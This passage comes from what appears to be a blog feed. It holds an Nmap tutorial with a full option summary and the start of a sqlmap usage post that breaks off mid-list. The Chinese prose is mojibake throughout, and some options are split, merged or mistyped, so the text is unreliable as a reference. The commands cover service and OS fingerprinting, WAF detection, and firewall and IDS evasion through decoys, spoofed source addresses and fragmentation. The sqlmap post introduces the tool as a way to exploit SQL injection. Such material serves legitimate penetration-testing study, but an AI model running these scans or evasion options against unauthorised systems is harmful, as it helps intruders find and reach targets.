å‘æœåŠ¡å™¨è¯¢é—®æ­£åœ¨è¿è¡Œçš„æœåŠ¡çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”åŸºäºå®ƒçŒœæµ‹æ“ä½œç³»ç»Ÿ"></a>Nmap å‘æœåŠ¡å™¨è¯¢é—®æ­£åœ¨è¿è¡Œçš„æœåŠ¡çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”åŸºäºå®ƒçŒœæµ‹æ“ä½œç³»ç»Ÿ</h4><ul><li><p>sVè¯·æ±‚æ¯ä¸ªè¢«å‘ç°çš„å¼€æ”¾ç«¯å£çš„æ ‡è¯†ï¼ˆå¤´éƒ¨æˆ–è€…è‡ªæˆ‘è¯†åˆ«ï¼‰ï¼Œè¿™æ˜¯å®ƒç”¨ä½œç‰ˆæœ¬çš„ä¸œè¥¿ã€‚</p></li><li><p>Oå‘Šè¯‰ Nmapï¼Œå°è¯•çŒœæµ‹è¿è¡Œåœ¨ç›®æ ‡ä¸Šçš„æ“ä½œç³»ç»Ÿã€‚ä½¿ç”¨å¼€æ”¾ç«¯å£å’Œç‰ˆæœ¬æ”¶é›†çš„ä¿¡æ¯ã€‚</p></li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sV -O <span class="number">192.168.56.10</span></span><br></pre></td></tr></table></figure><h4 id="æ›´åŠ æ¸…æ¥šçš„æŸ¥çœ‹è¿™ä¸ªç«¯å£ï¼Œå¹¶ä¸”çœ‹çœ‹å¯ä»¥ç¡®è®¤ä»€ä¹ˆ"><a href="#æ›´åŠ æ¸…æ¥šçš„æŸ¥çœ‹è¿™ä¸ªç«¯å£ï¼Œå¹¶ä¸”çœ‹çœ‹å¯ä»¥ç¡®è®¤ä»€ä¹ˆ" class="headerlink" title="æ›´åŠ æ¸…æ¥šçš„æŸ¥çœ‹è¿™ä¸ªç«¯å£ï¼Œå¹¶ä¸”çœ‹çœ‹å¯ä»¥ç¡®è®¤ä»€ä¹ˆ"></a>æ›´åŠ æ¸…æ¥šçš„æŸ¥çœ‹è¿™ä¸ªç«¯å£ï¼Œå¹¶ä¸”çœ‹çœ‹å¯ä»¥ç¡®è®¤ä»€ä¹ˆ</h4><p>ä½¿ç”¨æ­¤å‘½ä»¤ï¼Œè®© nmap åœ¨ä¸»æœºä¸Šçš„ FTP ç«¯å£ï¼ˆ-p 21ï¼‰ä¸Šè¿è¡Œå…¶é»˜è®¤è„šæœ¬ï¼ˆ-sCï¼‰</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sC <span class="number">192.168.56.102</span> -p <span class="number">21</span></span><br></pre></td></tr></table></figure><h4 id="Nmap-åŒ…å«äº†ä¸€äº›è„šæœ¬ï¼Œç”¨äºæµ‹è¯•-WAF-çš„å­˜åœ¨"><a href="#Nmap-åŒ…å«äº†ä¸€äº›è„šæœ¬ï¼Œç”¨äºæµ‹è¯•-WAF-çš„å­˜åœ¨" class="headerlink" title="Nmap åŒ…å«äº†ä¸€äº›è„šæœ¬ï¼Œç”¨äºæµ‹è¯• WAF çš„å­˜åœ¨"></a>Nmap åŒ…å«äº†ä¸€äº›è„šæœ¬ï¼Œç”¨äºæµ‹è¯• WAF çš„å­˜åœ¨</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">map</span> -p <span class="number">80</span>,<span class="number">443</span> --script=http-waf-detect <span class="number">192.168.56.102</span></span><br></pre></td></tr></table></figure><h4 id="å¦ä¸€ä¸ª-Nmap-è„šæœ¬ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬è¯†åˆ«æ‰€ä½¿ç”¨çš„è®¾å¤‡ï¼Œå¹¶æ›´åŠ ç²¾ç¡®"><a href="#å¦ä¸€ä¸ª-Nmap-è„šæœ¬ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬è¯†åˆ«æ‰€ä½¿ç”¨çš„è®¾å¤‡ï¼Œå¹¶æ›´åŠ ç²¾ç¡®" class="headerlink" title="å¦ä¸€ä¸ª Nmap è„šæœ¬ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬è¯†åˆ«æ‰€ä½¿ç”¨çš„è®¾å¤‡ï¼Œå¹¶æ›´åŠ ç²¾ç¡®"></a>å¦ä¸€ä¸ª Nmap è„šæœ¬ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬è¯†åˆ«æ‰€ä½¿ç”¨çš„è®¾å¤‡ï¼Œå¹¶æ›´åŠ ç²¾ç¡®</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p <span class="number">80</span>,<span class="number">443</span> --script=http-waf-fingerprint www.example.com</span><br></pre></td></tr></table></figure><h4 id="æœ‰ä¸€äº›å…¶å®ƒçš„å®ç”¨å‚æ•°ï¼š"><a href="#æœ‰ä¸€äº›å…¶å®ƒçš„å®ç”¨å‚æ•°ï¼š" class="headerlink" title="æœ‰ä¸€äº›å…¶å®ƒçš„å®ç”¨å‚æ•°ï¼š"></a>æœ‰ä¸€äº›å…¶å®ƒçš„å®ç”¨å‚æ•°ï¼š</h4><ul><li><p>sTï¼šé€šå¸¸ï¼Œåœ¨ root ç”¨æˆ·ä¸‹è¿è¡Œ Nmap æ—¶ï¼Œå®ƒä½¿ç”¨ SYN æ‰«æç±»å‹ã€‚ä½¿ç”¨è¿™ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬å°±å¼ºåˆ¶è®©æ‰«æå™¨æ‰§è¡Œå®Œå…¨è¿æ¥çš„æ‰«æã€‚å®ƒæ›´æ…¢ï¼Œå¹¶ä¸”ä¼šåœ¨æœåŠ¡å™¨çš„æ—¥å¿—ä¸­ç•™ä¸‹è®°å½•ï¼Œä½†æ˜¯å®ƒä¸å¤ªå¯èƒ½è¢«å…¥ä¾µæ£€æµ‹ç³»ç»Ÿæ£€æµ‹åˆ°ã€‚</p></li><li><p>Pnï¼šå¦‚æœæˆ‘ä»¬å·²ç»çŸ¥é“äº†ä¸»æœºæ˜¯æ´»åŠ¨çš„æˆ–è€…ä¸å“åº” pingï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‚æ•°å‘Šè¯‰ Nmap è·³è¿‡ ping æµ‹è¯•ï¼Œå¹¶æ‰«ææ‰€æœ‰æŒ‡å®šç›®æ ‡ï¼Œå‡è®¾å®ƒä»¬æ˜¯å¼€å¯çš„ã€‚</p></li><li><p>vï¼šè¿™ä¼šå¼€å¯è¯¦ç»†æ¨¡å¼ã€‚Nmap ä¼šå±•ç¤ºæ›´å¤šå…³äºå®ƒæ‰€åšäº‹æƒ…å’Œå¾—åˆ°å›å¤çš„ä¿¡æ¯ã€‚å‚æ•°å¯ä»¥åœ¨ç›¸åŒå‘½ä»¤ä¸­é‡å¤å¤šæ¬¡ï¼šæ¬¡æ•°è¶Šå¤šï¼Œå°±è¶Šè¯¦ç»†ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œ-vvæˆ–-v -v -v -vï¼‰ã€‚</p></li><li><p>p N1,N2,Nnï¼šå¦‚æœæˆ‘ä»¬æ‰“ç®—æµ‹è¯•ç‰¹å®šç«¯å£æˆ–ä¸€äº›éæ ‡å‡†ç«¯å£ï¼Œæˆ‘ä»¬å¯èƒ½æƒ³è¿™ä¸ªå‚æ•°ã€‚N1åˆ°Nnæ˜¯æ‰“ç®—è®© Nmap æ‰«æçš„ç«¯å£ã€‚ä¾‹å¦‚ï¼Œè¦æ‰«æç«¯å£ 21ï¼Œ80 åˆ° 90ï¼Œå’Œ 137ï¼Œå‚æ•°åº”ä¸ºï¼š-p 21,80-90,137ã€‚</p></li><li><p>â€“script=script_nameï¼šNmap åŒ…å«å¾ˆå¤šå®ç”¨çš„æ¼æ´æ£€æµ‹ã€æ‰«æå’Œè¯†åˆ«ã€ç™»å½•æµ‹è¯•ã€å‘½ä»¤æ‰§è¡Œã€ç”¨æˆ·æšä¸¾ä»¥åŠå…¶å®ƒè„šæœ¬ã€‚ä½¿ç”¨è¿™ä¸ªå‚æ•°æ¥å‘Šè¯‰ Nmap åœ¨ç›®æ ‡çš„å¼€æ”¾ç«¯å£ä¸Šè¿è¡Œè„šæœ¬ã€‚æŸ¥çœ‹ä¸€äº› Nmap è„šæœ¬ï¼Œå®ƒä»¬åœ¨ï¼š<a href="https://nmap.org/nsedoc/scripts/%E3%80%82">https://nmap.org/nsedoc/scripts/ã€‚</a></p></li></ul><h3 id="Nmapé€‰é¡¹æ‘˜è¦"><a href="#Nmapé€‰é¡¹æ‘˜è¦" class="headerlink" title="Nmapé€‰é¡¹æ‘˜è¦"></a>Nmapé€‰é¡¹æ‘˜è¦</h3><p><strong>ç”¨æ³•ï¼šnmap [æ‰«æç±»å‹] [é€‰é¡¹] {ç›®æ ‡è§„æ ¼}</strong></p><h4 id="ç›®æ ‡è§„æ ¼ï¼š"><a href="#ç›®æ ‡è§„æ ¼ï¼š" class="headerlink" title="ç›®æ ‡è§„æ ¼ï¼š"></a>ç›®æ ‡è§„æ ¼ï¼š</h4><p>å¯ä»¥ä¼ é€’ä¸»æœºåï¼ŒIPåœ°å€ï¼Œç½‘ç»œç­‰ã€‚<br>ä¾‹å¦‚ï¼šscanme.nmap.orgï¼Œmicrosoft.com/24,192.168.0.1; 10.0.0-255.1-254</p><ul><li>-iL <inputfilename>ï¼šä»ä¸»æœº/ç½‘ç»œåˆ—è¡¨ä¸­è¾“å…¥</li><li>-iR <num hosts>ï¼šé€‰æ‹©éšæœºç›®æ ‡</li><li>-exclude &lt;host1 [ï¼Œhost2] [ï¼Œhost3]ï¼Œâ€¦&gt;ï¼šæ’é™¤ä¸»æœº/ç½‘ç»œ</li><li>-excludefile <exclude_file>ï¼šä»æ–‡ä»¶ä¸­æ’é™¤åˆ—è¡¨</li></ul><h4 id="ä¸»æœºå‘ç°ï¼š"><a href="#ä¸»æœºå‘ç°ï¼š" class="headerlink" title="ä¸»æœºå‘ç°ï¼š"></a>ä¸»æœºå‘ç°ï¼š</h4><ul><li>-sLï¼šåˆ—è¡¨æ‰«æ â€“ ä»…åˆ—å‡ºè¦æ‰«æçš„ç›®æ ‡</li><li>-snï¼šPingæ‰«æ â€“ ç¦ç”¨ç«¯å£æ‰«æ</li><li>-Pnï¼šå°†æ‰€æœ‰ä¸»æœºè§†ä¸ºè”æœº â€“ è·³è¿‡ä¸»æœºå‘ç°</li><li>-PS / PA / PU / PY [portlist]ï¼šTCP SYN / ACK / UDP / SCTPå‘ç°åˆ°æŒ‡å®šç«¯å£</li><li>-PE / PP / PMï¼šICMPå›æ˜¾ï¼Œæ—¶é—´æˆ³å’Œç½‘ç»œæ©ç è¯·æ±‚å‘ç°æ¢æµ‹</li><li>-PO [åè®®åˆ—è¡¨]ï¼šIPåè®®Ping</li><li>-n / -Rï¼šä»ä¸æ‰§è¡ŒDNSè§£æ/æ€»æ˜¯è§£æ[é»˜è®¤ï¼šæœ‰æ—¶]</li><li>-dns-servers &lt;serv1 [ï¼Œserv2]ï¼Œâ€¦&gt;ï¼šæŒ‡å®šè‡ªå®šä¹‰DNSæœåŠ¡å™¨</li><li>-system-dnsï¼šä½¿ç”¨æ“ä½œç³»ç»Ÿçš„DNSè§£æå™¨</li><li>-tracerouteï¼šæ¯ä¸ªä¸»æœºçš„è·Ÿè¸ªè·³è½¬è·¯å¾„</li></ul><h4 id="SCANæŠ€æœ¯ï¼š"><a href="#SCANæŠ€æœ¯ï¼š" class="headerlink" title="SCANæŠ€æœ¯ï¼š"></a>SCANæŠ€æœ¯ï¼š</h4><ul><li>-sS / sT / sA / sW / sMï¼šTCP SYN / Connectï¼ˆï¼‰/ ACK / Window / Maimonæ‰«æ</li><li>-sUï¼šUDP æ‰«æ-sN</li><li>/ sF / sXï¼šTCP Nullï¼ŒFINå’ŒXmasæ‰«æ</li><li>â€“scanflags &lt; flags&gt;ï¼šè‡ªå®šä¹‰TCPæ‰«ææ ‡å¿—</li><li>-sI &lt;zombie host [ï¼šprobeport]&gt;ï¼šç©ºé—²æ‰«æ</li><li>-sY / sZï¼šSCTP INIT / COOKIE-ECHOæ‰«æ</li><li>-sOï¼šIPåè®®æ‰«æ</li><li>-b &lt;FTPä¸­ç»§ä¸»æœº&gt;ï¼šFTPåå¼¹æ‰«æ</li></ul><h4 id="ç«¯å£è§„æ ¼å’Œæ‰«æ-é¡ºåºï¼š-p"><a href="#ç«¯å£è§„æ ¼å’Œæ‰«æ-é¡ºåºï¼š-p" class="headerlink" title="ç«¯å£è§„æ ¼å’Œæ‰«æ é¡ºåºï¼š-p"></a>ç«¯å£è§„æ ¼å’Œæ‰«æ é¡ºåºï¼š-p</h4><p>&lt;ç«¯å£èŒƒå›´&gt;ï¼šä»…æ‰«ææŒ‡å®šçš„ç«¯å£</p><ul><li>ä¾‹å¦‚ï¼š-p22; -p1-65535; -p Uï¼š53,111,137ï¼ŒTï¼š21-25,80,139,8080ï¼ŒSï¼š9</li><li>-exclude-ports &lt;ç«¯å£èŒƒå›´&gt;ï¼šä»æ‰«æä¸­æ’é™¤æŒ‡å®šç«¯å£</li><li>-Fï¼šå¿«é€Ÿæ¨¡å¼ â€“ æ‰«æç«¯å£å°‘äºé»˜è®¤æ‰«æ</li><li>-rï¼šè¿ç»­æ‰«æç«¯å£ â€“ ä¸éšæœºåŒ–</li><li>-top-ports <number>ï¼šæ‰«æ<number>æœ€å¸¸ç”¨çš„ç«¯å£</li><li>-port-ratio <ratio>ï¼šæ‰«ææ¯”<ratio></li></ul><h4 id="æœåŠ¡-ç‰ˆæœ¬æ£€æµ‹ï¼š"><a href="#æœåŠ¡-ç‰ˆæœ¬æ£€æµ‹ï¼š" class="headerlink" title="æœåŠ¡/ç‰ˆæœ¬æ£€æµ‹ï¼š"></a>æœåŠ¡/ç‰ˆæœ¬æ£€æµ‹ï¼š</h4><ul><li>-sVï¼šæ¢æµ‹å¼€æ”¾ç«¯å£ä»¥ç¡®å®šæœåŠ¡/ç‰ˆæœ¬info</li><li>-version-intensity <level>ï¼šè®¾ç½®ä»0ï¼ˆäº®ï¼‰åˆ°9ï¼ˆå°è¯•æ‰€æœ‰æ¢æµ‹å™¨ï¼‰</li><li>-version-lightï¼šé™åˆ¶æœ€å¯èƒ½çš„æ¢æµ‹å™¨2ï¼‰</li><li>-version-allï¼šå°è¯•æ¯ä¸ªæ¢æµ‹å™¨ï¼ˆå¼ºåº¦9ï¼‰</li><li>-version-traceï¼šæ˜¾ç¤ºè¯¦ç»†ç‰ˆæœ¬çš„æ‰«ææ´»åŠ¨ï¼ˆç”¨äºè°ƒè¯•ï¼‰</li></ul><h4 id="SCRIPT-SCANï¼š"><a href="#SCRIPT-SCANï¼š" class="headerlink" title="SCRIPT SCANï¼š"></a>SCRIPT SCANï¼š</h4><ul><li>-sCï¼šç›¸å½“äº-script =é»˜è®¤</li><li>-script = &lt;Luaè„šæœ¬&gt;ï¼š<Lua scripts>æ˜¯é€—å·åˆ†éš”çš„</li><li>ç›®å½•åˆ—è¡¨ï¼Œè„šæœ¬æ–‡ä»¶æˆ–è„šæœ¬ç±»åˆ«</li><li>-script-args = &lt;n1 = v1ï¼Œ[ n2 = v2ï¼Œâ€¦]&gt;ï¼šä¸ºè„šæœ¬æä¾›å‚æ•°</li><li>-script-args-file = filenameï¼šåœ¨æ–‡ä»¶ä¸­æä¾›NSEè„šæœ¬å‚æ•°</li><li>-script-traceï¼šæ˜¾ç¤ºæ‰€æœ‰å‘é€å’Œæ¥æ”¶çš„æ•°æ®</li><li>-script-updatedbï¼šæ›´æ–°è„šæœ¬æ•°æ®åº“ã€‚</li><li>-script-help = <Lua scripts>ï¼šæ˜¾ç¤ºæœ‰å…³è„šæœ¬çš„å¸®åŠ©ã€‚</li><li><Lua scripts>æ˜¯è„šæœ¬æ–‡ä»¶æˆ–</li><li>è„šæœ¬ç±»åˆ«çš„é€—å·åˆ†éš”åˆ—è¡¨ã€‚</li></ul><h4 id="æ“ä½œç³»ç»Ÿæ£€æµ‹ï¼š"><a href="#æ“ä½œç³»ç»Ÿæ£€æµ‹ï¼š" class="headerlink" title="æ“ä½œç³»ç»Ÿæ£€æµ‹ï¼š"></a>æ“ä½œç³»ç»Ÿæ£€æµ‹ï¼š</h4><ul><li>-Oï¼šå¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹</li><li>-osscan-limitï¼šé™åˆ¶æ“ä½œç³»ç»Ÿæ£€æµ‹ä¸ºæœ‰å‰é€”çš„ç›®æ ‡</li><li>-osscan-guessï¼šçŒœæµ‹æ“ä½œç³»ç»Ÿæ›´ç§¯æ</li></ul><h4 id="æ—¶é—´å’Œæ€§èƒ½ï¼š"><a href="#æ—¶é—´å’Œæ€§èƒ½ï¼š" class="headerlink" title="æ—¶é—´å’Œæ€§èƒ½ï¼š"></a>æ—¶é—´å’Œæ€§èƒ½ï¼š</h4><ul><li>é‡‡ç”¨<code>&lt;time&gt;</code>çš„é€‰é¡¹ä»¥ç§’ä¸ºå•ä½ï¼Œæˆ–é™„åŠ â€™msâ€™ï¼ˆæ¯«ç§’ï¼‰ï¼Œâ€˜sâ€™ï¼ˆç§’ï¼‰ï¼Œâ€™mâ€™ï¼ˆåˆ†é’Ÿï¼‰æˆ–â€™hâ€™ï¼ˆå°æ—¶ï¼‰ ï¼‰ã€‚</li><li>-T &lt;0-5&gt;ï¼šè®¾ç½®å®šæ—¶æ¨¡æ¿ï¼ˆæ›´é«˜æ›´å¿«ï¼‰</li><li>-min-hostgroup / max-hostgroup <size>ï¼šå¹¶è¡Œä¸»æœºæ‰«æç»„å¤§å°</li><li>-min-parallelism / max-parallelism <numprobes>ï¼šæ¢é’ˆå¹¶è¡ŒåŒ–</li><li>-min- rtt-timeout / max-rtt-timeout / initial-rtt-timeout <time>ï¼šæŒ‡å®š</li><li>æ¢æµ‹å¾€è¿”æ—¶é—´ã€‚</li><li>-max-retries <tries>ï¼šç«¯å£æ‰«ææ¢æµ‹å™¨é‡æ–°ä¼ è¾“çš„å¤§å°æ•°é‡ã€‚</li><li>-host-timeout <time>ï¼šåœ¨è¿™ä¸ªlong</li><li>-scan-delay ä¹‹åæ”¾å¼ƒç›®æ ‡/ -max-scan-delay <time>ï¼šè°ƒæ•´æ¢é’ˆä¹‹é—´çš„å»¶è¿Ÿ</li><li>-min-rate <number>ï¼š</li><li>-max-rate <number>ï¼šå‘é€æ•°æ®åŒ…ä¸è¶…è¿‡æ¯ç§’<number></li></ul><h4 id="é˜²ç«å¢™-IDSæ¶ˆé™¤å’Œé˜²ç›—ï¼š"><a href="#é˜²ç«å¢™-IDSæ¶ˆé™¤å’Œé˜²ç›—ï¼š" class="headerlink" title="é˜²ç«å¢™/ IDSæ¶ˆé™¤å’Œé˜²ç›—ï¼š"></a>é˜²ç«å¢™/ IDSæ¶ˆé™¤å’Œé˜²ç›—ï¼š</h4><ul><li>-f; -mtu <val>ï¼šç‰‡æ®µæ•°æ®åŒ…ï¼ˆå¯é€‰w / given MTUï¼‰</li><li>-D &lt;decoy1ï¼Œdecoy2 [ï¼ŒME]ï¼Œâ€¦&gt;ï¼šç”¨è¯±é¥µéšè—æ‰«æ</li><li>-S <IP_Address>ï¼šæ¬ºéª—æºåœ°å€</li><li>-e <iface>ï¼šä½¿ç”¨æŒ‡å®šçš„æ¥å£</li><li>-g / -source-port &lt;</li><li>portnum &gt;ï¼šä½¿ç”¨ç»™å®šçš„ç«¯å£å·-proxies &lt;url1ï¼Œ[url2]ï¼Œâ€¦&gt;ï¼šé€šè¿‡HTTP / SOCKS4ä»£ç†æœåŠ¡å™¨çš„ä¸­ç»§è¿æ¥</li><li>-data &lt;åå…­è¿›åˆ¶å­—ç¬¦ä¸²&gt;ï¼šå°†è‡ªå®šä¹‰æœ‰æ•ˆå†…å®¹é™„åŠ åˆ°å·²å‘é€æ•°æ®åŒ…</li><li>-data-string <string>ï¼šå°†è‡ªå®šä¹‰ASCIIå­—ç¬¦ä¸²é™„åŠ åˆ°å·²å‘é€æ•°æ®åŒ…</li><li>-data-length <num>ï¼šå°†éšæœºæ•°æ®é™„åŠ åˆ°å·²å‘é€æ•°æ®åŒ…</li><li>-ip-options &lt;é€‰é¡¹&gt;ï¼šå‘é€æŒ‡å®šipé€‰é¡¹çš„æ•°æ®åŒ…</li><li>-ttl <val>ï¼šè®¾ç½®IPç”Ÿå­˜æ—¶é—´å­—æ®µ</li><li>-spoof-mac &lt;</li><li>-badsumï¼šå‘é€è™šå‡TCP / UDP / SCTPæ ¡éªŒå’Œçš„æ•°æ®åŒ…</li></ul><h4 id="OUTPUT"><a href="#OUTPUT" class="headerlink" title="OUTPUT"></a>OUTPUT</h4><ul><li>-oN / -oX / -oS / -oG <file>ï¼šåˆ†åˆ«ä»¥æ­£å¸¸ï¼ŒXMLï¼Œs | &lt;rIpt kIddi3</li><li>å’ŒGrepableæ ¼å¼è¾“å‡ºæ‰«æåˆ°ç»™å®šçš„æ–‡ä»¶åã€‚</li><li>-oA <basename>ï¼šä¸€æ¬¡è¾“å‡ºä¸‰ç§ä¸»è¦æ ¼å¼</li><li>-vï¼šæé«˜è¯¦ç»†çº§åˆ«ï¼ˆä½¿ç”¨-vvæˆ–æ›´å¤šä»¥è·å¾—æ›´å¤§æ•ˆæœï¼‰</li><li>-dï¼šæé«˜è°ƒè¯•çº§åˆ«ï¼ˆä½¿ç”¨-ddæˆ–æ›´å¤šä»¥è·å¾—æ›´å¤§æ•ˆæœï¼‰</li><li>-reasonï¼šDisplayç«¯å£å¤„äºç‰¹å®šçŠ¶æ€çš„åŸå› </li><li>-openï¼šåªæ˜¾ç¤ºæ‰“å¼€çš„ï¼ˆæˆ–å¯èƒ½æ‰“å¼€çš„ï¼‰ç«¯å£</li><li>-packet-traceï¼šæ˜¾ç¤ºæ‰€æœ‰å‘é€å’Œæ¥æ”¶çš„æ•°æ®åŒ…</li><li>-iflistï¼šæ‰“å°ä¸»æœºæ¥å£å’Œè·¯ç”±ï¼ˆç”¨äºè°ƒè¯•ï¼‰</li><li>-log-errorsï¼šLogé”™è¯¯/è­¦å‘Šåˆ°æ­£å¸¸æ ¼å¼çš„è¾“å‡ºæ–‡ä»¶</li><li>-append-outputï¼šé™„åŠ åˆ°æŒ‡å®šçš„è¾“å‡ºæ–‡ä»¶è€Œä¸æ˜¯clobber</li><li>-resume <filename>ï¼šæ¢å¤ä¸­æ­¢çš„æ‰«æ</li><li>-stylesheet &lt;path / URL&gt;ï¼šXSLæ ·å¼è¡¨å°†XMLè¾“å‡ºè½¬æ¢ä¸ºHTML</li><li>-webxmlï¼šNmap.Orgçš„å‚è€ƒæ ·å¼è¡¨ï¼Œç”¨äºæ›´å¤šå¯ç§»æ¤çš„XML</li><li>-no-stylesheetï¼šé˜²æ­¢å…³è”XSLæ ·å¼è¡¨w / XMLè¾“å‡º</li></ul><h4 id="MISCï¼š"><a href="#MISCï¼š" class="headerlink" title="MISCï¼š"></a>MISCï¼š</h4><ul><li>-6ï¼šå¯ç”¨IPv6æ‰«æ</li><li>-Aï¼šå¯ç”¨OSæ£€æµ‹ï¼Œç‰ˆæœ¬æ£€æµ‹ï¼Œè„šæœ¬æ‰«æå’Œtraceroute</li><li>-datadir <dirname>ï¼šæŒ‡å®šè‡ªå®šä¹‰Nmapæ•°æ®æ–‡ä»¶ä½ç½®</li><li>-send-eth / -send-ipï¼šä½¿ç”¨åŸå§‹ä»¥å¤ªç½‘å¸§è¿›è¡Œå‘é€æˆ–IPæ•°æ®åŒ…</li><li>-privilegedï¼šå‡è®¾ç”¨æˆ·å…·æœ‰å®Œå…¨ç‰¹æƒ</li><li>-unprivilegedï¼šå‡å®šç”¨æˆ·ç¼ºå°‘åŸå§‹å¥—æ¥å­—æƒé™</li><li>-Vï¼šæ‰“å°ç‰ˆæœ¬å·</li><li>-hï¼šæ‰“å°æ­¤å¸®åŠ©æ‘˜è¦é¡µé¢</li></ul><h4 id="å¦è§"><a href="#å¦è§" class="headerlink" title="å¦è§"></a>å¦è§</h4><p>è™½ç„¶å®ƒæœ€ä¸ºæµè¡Œï¼Œä½†æ˜¯ Nmap ä¸æ˜¯å”¯ä¸€å¯ç”¨çš„ç«¯å£æ‰«æå™¨ï¼Œå¹¶ä¸”ï¼Œå–å†³äºä¸åŒçš„å–œå¥½ï¼Œå¯èƒ½ä¹Ÿä¸æ˜¯æœ€å¥½çš„ã€‚ä¸‹é¢æ˜¯ Kali ä¸­åŒ…å«çš„ä¸€äº›å…¶å®ƒçš„æ›¿ä»£å“ï¼š</p><ul><li>unicornscan</li><li>hping3</li><li>masscan</li><li>amap</li><li>Metasploit scanning module</li></ul>]]></content>
      
      
      <categories>
          
          <category> hacker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmapåŸºæœ¬ä½¿ç”¨</title>
      <link href="post/41891/"/>
      <url>post/41891/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>SQLMap æ˜¯ä¸€ä¸ªå¼€æºçš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œå¯ä»¥ç”¨æ¥è¿›è¡Œè‡ªåŠ¨åŒ–æ£€æµ‹ï¼Œåˆ©ç”¨ SQL æ³¨å…¥æ¼æ´ï¼Œè·å–æ•°æ®åº“æœåŠ¡å™¨çš„æƒé™ã€‚å®ƒå…·æœ‰åŠŸèƒ½å¼ºå¤§çš„æ£€æµ‹å¼•æ“ï¼Œé’ˆå¯¹å„ç§ä¸åŒç±»å‹æ•°æ®åº“çš„æ¸—é€æµ‹è¯•çš„åŠŸèƒ½é€‰é¡¹ï¼ŒåŒ…æ‹¬è·å–æ•°æ®åº“ä¸­å­˜å‚¨çš„æ•°æ®ï¼Œè®¿é—®æ“ä½œç³»ç»Ÿæ–‡ä»¶ç”šè‡³å¯ä»¥é€šè¿‡å¤–å¸¦æ•°æ®è¿æ¥çš„æ–¹å¼æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚</p><span id="more"></span><h3 id="Optionsï¼ˆé€‰é¡¹ï¼‰"><a href="#Optionsï¼ˆé€‰é¡¹ï¼‰" class="headerlink" title="Optionsï¼ˆé€‰é¡¹ï¼‰"></a>Optionsï¼ˆé€‰é¡¹ï¼‰</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Usage</span>: python sqlmap.py [<span class="keyword">options</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">Options</span>ï¼ˆé€‰é¡¹ï¼‰:</span><br><span class="line"></span><br><span class="line">-h, <span class="comment">--help Show basic help message and exit</span></span><br><span class="line">## å±•ç¤ºå¸®åŠ©æ–‡æ¡£ å‚æ•°</span><br><span class="line"></span><br><span class="line">-hh <span class="keyword">Show</span> advanced help message <span class="keyword">and</span> <span class="keyword">exit</span></span><br><span class="line">## å±•ç¤ºè¯¦ç»†å¸®åŠ©æ–‡æ¡£å‚æ•°</span><br><span class="line"></span><br><span class="line"><span class="comment">--version Show program&#x27;s version number and exit</span></span><br><span class="line">## æ˜¾ç¤ºç¨‹åºçš„ç‰ˆæœ¬å·</span><br><span class="line"></span><br><span class="line">-v <span class="keyword">VERBOSE</span> Verbosity <span class="keyword">level</span>: <span class="number">0</span><span class="number">-6</span> (<span class="keyword">default</span> <span class="number">1</span>)</span><br><span class="line">## è¯¦ç»†çº§åˆ«ï¼š<span class="number">0</span><span class="number">-6</span>ï¼ˆé»˜è®¤ä¸º<span class="number">1</span>ï¼‰</span><br></pre></td></tr></table></figure><h3 id="Targetï¼ˆç›®æ ‡ï¼‰"><a href="#Targetï¼ˆç›®æ ‡ï¼‰" class="headerlink" title="Targetï¼ˆç›®æ ‡ï¼‰"></a>Targetï¼ˆç›®æ ‡ï¼‰</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Targetï¼ˆç›®æ ‡ï¼‰:</span><br><span class="line"></span><br><span class="line">At least <span class="literal">one</span> <span class="keyword">of</span> these options has <span class="built_in">to</span> be provided <span class="built_in">to</span> define <span class="keyword">the</span> target(s)</span><br><span class="line"></span><br><span class="line">-d DIRECT Connection <span class="keyword">string</span> <span class="keyword">for</span> direct database connection</span><br><span class="line"><span class="comment">## æŒ‡å®šå…·ä½“æ•°æ®åº“</span></span><br><span class="line"></span><br><span class="line">-u <span class="built_in">URL</span>, <span 